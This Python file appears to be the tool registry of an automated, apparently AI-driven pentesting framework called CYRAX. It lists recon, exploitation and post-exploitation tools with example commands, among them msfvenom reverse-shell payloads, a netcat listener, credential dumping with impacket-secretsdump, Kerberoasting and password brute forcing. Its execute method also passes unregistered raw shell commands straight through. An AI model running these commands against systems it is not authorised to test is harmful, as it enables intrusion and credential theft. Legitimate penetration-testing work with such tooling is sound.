"""
CYRAX Tool Registry
Catalog of available pentesting tools with metadata and execution wrappers.
"""

from dataclasses import dataclass, field
from typing import Optional, Callable

from tools.executor import ToolExecutor, CommandResult
from utils.logging import get_logger


@dataclass
class ToolDefinition:
    """Definition of a registered tool."""

    name: str
    description: str
    category: str
    command_template: str
    # Whether the tool is available on this system
    available: bool = False
    # Example usage
    examples: list[str] = field(default_factory=list)
    # Custom parser function for output
    output_parser: Optional[Callable[[str], dict]] = None


class ToolRegistry:
    """
    Registry of available pentesting tools.
    Manages tool discovery, execution, and output parsing.
    """

    def __init__(self, executor: Optional[ToolExecutor] = None):
        self.executor = executor or ToolExecutor()
        self.tools: dict[str, ToolDefinition] = {}
        self._register_default_tools()
        self._check_availability()

    def _register_default_tools(self):
        """Register all known pentesting tools."""

        # === Reconnaissance ===
        self._register(
            "nmap",
            "Network scanner for port scanning and service detection",
            "recon",
            "nmap {args}",
            examples=["nmap -sV -sC target.com", "nmap -p- -T4 target.com"],
        )
        self._register(
            "subfinder",
            "Fast passive subdomain discovery tool",
            "recon",
            "subfinder {args}",
            examples=["subfinder -d target.com -silent"],
        )
        self._register(
            "amass",
            "In-depth attack surface mapping and asset discovery",
            "recon",
            "amass {args}",
            examples=["amass enum -passive -d target.com"],
        )
        self._register(
            "masscan",
            "High-speed port scanner",
            "recon",
            "masscan {args}",
            examples=["masscan -p1-65535 --rate 1000 target.com"],
        )
        self._register(
            "dnsx",
            "Fast multi-purpose DNS toolkit",
            "recon",
            "dnsx {args}",
            examples=["echo target.com | dnsx -resp"],
        )
        self._register(
            "httpx",
            "Fast HTTP probing tool",
            "recon",
            "httpx {args}",
            examples=["cat subdomains.txt | httpx -title -status-code"],
        )
        self._register(
            "whois",
            "WHOIS domain lookup",
            "recon",
            "whois {args}",
            examples=["whois target.com"],
        )
        self._register(
            "dig",
            "DNS lookup utility",
            "recon",
            "dig {args}",
            examples=["dig target.com ANY", "dig @8.8.8.8 target.com"],
        )
        self._register(
            "theHarvester",
            "OSINT tool for email, subdomain, and name gathering",
            "recon",
            "theHarvester {args}",
            examples=["theHarvester -d target.com -b all"],
        )
        self._register(
            "wafw00f",
            "Web Application Firewall detection tool",
            "recon",
            "wafw00f {args}",
            examples=["wafw00f https://target.com"],
        )

        # === Web Application Testing ===
        self._register(
            "nikto",
            "Web server scanner for vulnerabilities",
            "web",
            "nikto {args}",
            examples=["nikto -h https://target.com"],
        )
        self._register(
            "gobuster",
            "Directory/file and DNS brute forcing tool",
            "web",
            "gobuster {args}",
            examples=[
                "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt"
            ],
        )
        self._register(
            "ffuf",
            "Fast web fuzzer",
            "web",
            "ffuf {args}",
            examples=[
                "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"
            ],
        )
        self._register(
            "sqlmap",
            "Automatic SQL injection and database takeover tool",
            "web",
            "sqlmap {args}",
            examples=["sqlmap -u 'https://target.com/page?id=1' --batch"],
        )
        self._register(
            "wpscan",
            "WordPress security scanner",
            "web",
            "wpscan {args}",
            examples=["wpscan --url https://target.com"],
        )
        self._register(
            "nuclei",
            "Fast vulnerability scanner using templates",
            "web",
            "nuclei {args}",
            examples=["nuclei -u https://target.com -t cves/"],
        )
        self._register(
            "dalfox",
            "XSS scanning and parameter analysis tool",
            "web",
            "dalfox {args}",
            examples=["dalfox url https://target.com/page?q=test"],
        )

        # === Exploitation ===
        self._register(
            "msfconsole",
            "Metasploit Framework console",
            "exploit",
            "msfconsole {args}",
            examples=["msfconsole -q -x 'use exploit/multi/handler; run'"],
        )
        self._register(
            "searchsploit",
            "Search Exploit-DB for public exploits",
            "exploit",
            "searchsploit {args}",
            examples=["searchsploit apache 2.4", "searchsploit -m 12345"],
        )
        self._register(
            "msfvenom",
            "Metasploit payload generator for shellcode, executables, and scripts",
            "exploit",
            "msfvenom {args}",
            examples=[
                "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe",
                "msfvenom --list payloads | grep reverse_tcp",
            ],
        )
        self._register(
            "hydra",
            "Network login cracker for brute forcing",
            "exploit",
            "hydra {args}",
            examples=["hydra -l admin -P passwords.txt target.com ssh"],
        )
        self._register(
            "john",
            "John the Ripper password cracker",
            "exploit",
            "john {args}",
            examples=["john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"],
        )
        self._register(
            "hashcat",
            "Advanced password recovery tool",
            "exploit",
            "hashcat {args}",
            examples=["hashcat -m 0 hashes.txt wordlist.txt"],
        )

        # === Post-Exploitation ===
        self._register(
            "impacket-secretsdump",
            "Dump credentials from Windows systems (Impacket)",
            "post",
            "impacket-secretsdump {args}",
            examples=["impacket-secretsdump domain/user:pass@target"],
        )
        self._register(
            "impacket-psexec",
            "Remote command execution via PsExec (Impacket)",
            "post",
            "impacket-psexec {args}",
            examples=["impacket-psexec domain/user:pass@target"],
        )
        self._register(
            "impacket-wmiexec",
            "Remote command execution via WMI (Impacket)",
            "post",
            "impacket-wmiexec {args}",
            examples=["impacket-wmiexec domain/user:pass@target"],
        )
        self._register(
            "impacket-smbexec",
            "Remote command execution via SMB (Impacket)",
            "post",
            "impacket-smbexec {args}",
            examples=["impacket-smbexec domain/user:pass@target"],
        )
        self._register(
            "impacket-GetNPUsers",
            "AS-REP roasting - find users without Kerberos preauth",
            "post",
            "impacket-GetNPUsers {args}",
            examples=["impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass"],
        )
        self._register(
            "impacket-GetUserSPNs",
            "Kerberoasting - extract service ticket hashes",
            "post",
            "impacket-GetUserSPNs {args}",
            examples=["impacket-GetUserSPNs domain.local/user:pass -request"],
        )
        self._register(
            "crackmapexec",
            "Swiss army knife for Windows/AD networks",
            "post",
            "crackmapexec {args}",
            examples=["crackmapexec smb 10.0.0.0/24 -u user -p pass"],
        )
        self._register(
            "evil-winrm",
            "Windows Remote Management shell",
            "post",
            "evil-winrm {args}",
            examples=["evil-winrm -i target -u user -p pass"],
        )
        self._register(
            "bloodhound-python",
            "BloodHound ingestor for Active Directory enumeration",
            "post",
            "bloodhound-python {args}",
            examples=["bloodhound-python -u user -p pass -d domain.local -ns dc_ip"],
        )
        self._register(
            "smbclient",
            "SMB/CIFS client for file share access",
            "post",
            "smbclient {args}",
            examples=["smbclient //target/share -U user%pass"],
        )
        self._register(
            "ldapsearch",
            "LDAP directory search tool",
            "post",
            "ldapsearch {args}",
            examples=[
                "ldapsearch -x -H ldap://dc.domain.local -D 'user@domain.local' -w pass -b 'DC=domain,DC=local'"
            ],
        )

        # === Network Tools ===
        self._register(
            "curl",
            "HTTP client for making requests",
            "network",
            "curl {args}",
            examples=["curl -s -o /dev/null -w '%{http_code}' https://target.com"],
        )
        self._register(
            "wget",
            "File download utility",
            "network",
            "wget {args}",
            examples=["wget -q https://target.com/file"],
        )
        self._register(
            "nc",
            "Netcat - TCP/UDP networking utility",
            "network",
            "nc {args}",
            examples=["nc -lvnp 4444"],
        )
        self._register(
            "socat",
            "Multipurpose relay for bidirectional data transfer",
            "network",
            "socat {args}",
            examples=["socat TCP-LISTEN:8080,fork TCP:target:80"],
        )
        self._register(
            "ssh",
            "Secure Shell client",
            "network",
            "ssh {args}",
            examples=["ssh -i key.pem user@target"],
        )
        self._register(
            "proxychains4",
            "TCP traffic tunneling through proxy chains",
            "network",
            "proxychains4 {args}",
            examples=["proxychains4 nmap -sT target"],
        )
        self._register(
            "chisel",
            "TCP/UDP tunnel over HTTP with SSH encryption",
            "network",
            "chisel {args}",
            examples=["chisel server -p 8080 --reverse"],
        )

        # === Utility Tools ===
        self._register(
            "python3",
            "Python 3 interpreter for custom scripts",
            "utility",
            "python3 {args}",
            examples=["python3 -c 'print(1)'", "python3 exploit.py"],
        )
        self._register(
            "grep",
            "Text search utility",
            "utility",
            "grep {args}",
            examples=["grep -r 'password' /path/"],
        )
        self._register(
            "awk",
            "Text processing tool",
            "utility",
            "awk {args}",
            examples=["awk '{print $1}' file.txt"],
        )
        self._register(
            "base64",
            "Base64 encode/decode",
            "utility",
            "base64 {args}",
            examples=["echo 'text' | base64", "echo 'dGV4dA==' | base64 -d"],
        )
        self._register(
            "openssl",
            "SSL/TLS toolkit",
            "utility",
            "openssl {args}",
            examples=["openssl s_client -connect target.com:443"],
        )
        self._register(
            "jq",
            "JSON processor",
            "utility",
            "jq {args}",
            examples=["cat data.json | jq '.key'"],
        )

        # === Cloud Tools ===
        self._register(
            "aws",
            "AWS CLI for cloud enumeration and exploitation",
            "cloud",
            "aws {args}",
            examples=["aws s3 ls", "aws sts get-caller-identity"],
        )
        self._register(
            "az",
            "Azure CLI",
            "cloud",
            "az {args}",
            examples=["az account list", "az vm list"],
        )
        self._register(
            "gcloud",
            "Google Cloud CLI",
            "cloud",
            "gcloud {args}",
            examples=["gcloud projects list"],
        )

    def _register(
        self,
        name: str,
        description: str,
        category: str,
        command_template: str,
        examples: Optional[list[str]] = None,
        output_parser: Optional[Callable] = None,
    ):
        """Register a tool."""
        self.tools[name] = ToolDefinition(
            name=name,
            description=description,
            category=category,
            command_template=command_template,
            examples=examples or [],
            output_parser=output_parser,
        )

    def _check_availability(self):
        """Check which tools are available on the system."""
        logger = get_logger()
        available_count = 0
        for name, tool in self.tools.items():
            # Extract the base command from the template
            base_cmd = tool.command_template.split()[0]
            tool.available = self.executor.check_tool_available(base_cmd)
            if tool.available:
                available_count += 1
        logger.info(
            f"Tool availability check: {available_count}/{len(self.tools)} tools available"
        )

    def execute(
        self, tool_name: str, args: str, timeout: Optional[int] = None
    ) -> CommandResult:
        """
        Execute a registered tool.

        Args:
            tool_name: Name of the tool to execute.
            args: Arguments to pass to the tool.
            timeout: Optional timeout override.

        Returns:
            CommandResult with output.
        """
        logger = get_logger()

        if tool_name not in self.tools:
            # Allow executing arbitrary commands for flexibility
            logger.debug(f"Executing unregistered command: {tool_name} {args}")
            return self.executor.execute(f"{tool_name} {args}", timeout=timeout)

        tool = self.tools[tool_name]
        if not tool.available:
            logger.warning(f"Tool {tool_name} may not be available on this system")

        command = tool.command_template.replace("{args}", args)
        result = self.executor.execute(command, timeout=timeout)

        # Apply custom parser if available
        if tool.output_parser and result.success:
            try:
                parsed = tool.output_parser(result.stdout)
                result.parsed = parsed
            except Exception as e:
                logger.debug(f"Output parser failed for {tool_name}: {e}")

        return result

    def execute_raw(self, command: str, timeout: Optional[int] = None) -> CommandResult:
        """Execute a raw shell command (not from registry)."""
        return self.executor.execute(command, timeout=timeout)

    def list_tools(self, category: Optional[str] = None) -> list[dict]:
        """List registered tools, optionally filtered by category."""
        tools = []
        for name, tool in sorted(self.tools.items()):
            if category and tool.category != category:
                continue
            tools.append(
                {
                    "name": name,
                    "description": tool.description,
                    "category": tool.category,
                    "available": tool.available,
                    "examples": tool.examples,
                }
            )
        return tools

    def list_categories(self) -> list[str]:
        """List all tool categories."""
        return sorted(set(t.category for t in self.tools.values()))

    def get_available_tools_summary(self) -> str:
        """Get a formatted summary of available tools for use in prompts."""
        lines = []
        for category in self.list_categories():
            cat_tools = [
                t for t in self.tools.values() if t.category == category and t.available
            ]
            if cat_tools:
                lines.append(f"\n[{category.upper()}]")
                for tool in sorted(cat_tools, key=lambda t: t.name):
                    lines.append(f"  - {tool.name}: {tool.description}")
        return "\n".join(lines)
